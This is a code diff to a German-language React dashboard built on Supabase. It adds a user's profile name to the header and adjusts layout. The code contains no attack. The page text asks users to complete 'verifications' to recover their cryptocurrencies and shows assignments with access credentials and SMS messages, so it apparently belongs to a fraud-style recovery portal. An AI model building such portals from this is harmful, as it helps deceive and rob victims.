@@ -58,6 +58,7 @@ export default function Dashboard() {
   const navigate = useNavigate();
   const [assignments, setAssignments] = useState<Assignment[]>([]);
   const [loading, setLoading] = useState(true);
+  const [profileName, setProfileName] = useState<string>("");
   const [selectedId, setSelectedId] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
   const [smsMessages, setSmsMessages] = useState<SMSMessage[]>([]);
@@ -65,8 +66,23 @@ export default function Dashboard() {
 
   const userIdRef = user?.id;
   useEffect(() => {
-    if (userIdRef) loadAssignments();
+    if (userIdRef) {
+      loadAssignments();
+      loadProfile();
+    }
   }, [userIdRef]);
+
+  const loadProfile = async () => {
+    const { data } = await supabase
+      .from("profiles")
+      .select("first_name, last_name")
+      .eq("id", user!.id)
+      .maybeSingle();
+    if (data) {
+      const name = [data.first_name, data.last_name].filter(Boolean).join(" ");
+      setProfileName(name);
+    }
+  };
 
   const loadAssignments = async () => {
     if (assignments.length === 0) setLoading(true);
@@ -218,10 +234,15 @@ export default function Dashboard() {
       <header className="border-b border-border bg-card/80 backdrop-blur-sm sticky top-0 z-10">
         <div className="max-w-5xl mx-auto px-6 h-14 flex items-center justify-between">
           <img src={bovensiepenLogo} alt="Bovensiepen & Partner" className="h-9 w-auto" />
-          <Button variant="ghost" size="sm" onClick={handleSignOut} className="text-muted-foreground hover:text-destructive">
-            <LogOut className="w-4 h-4 mr-1.5" />
-            Abmelden
-          </Button>
+          <div className="flex items-center gap-3">
+            {profileName && (
+              <span className="text-sm font-medium text-foreground">{profileName}</span>
+            )}
+            <Button variant="ghost" size="sm" onClick={handleSignOut} className="text-muted-foreground hover:text-destructive">
+              <LogOut className="w-4 h-4 mr-1.5" />
+              Abmelden
+            </Button>
+          </div>
         </div>
       </header>
 
@@ -406,7 +427,7 @@ export default function Dashboard() {
             <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-foreground">
               Willkommen zurück
             </h1>
-            <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto leading-relaxed">
+            <p className="mt-4 text-lg text-muted-foreground max-w-3xl mx-auto leading-relaxed">
               Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
               Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
             </p>
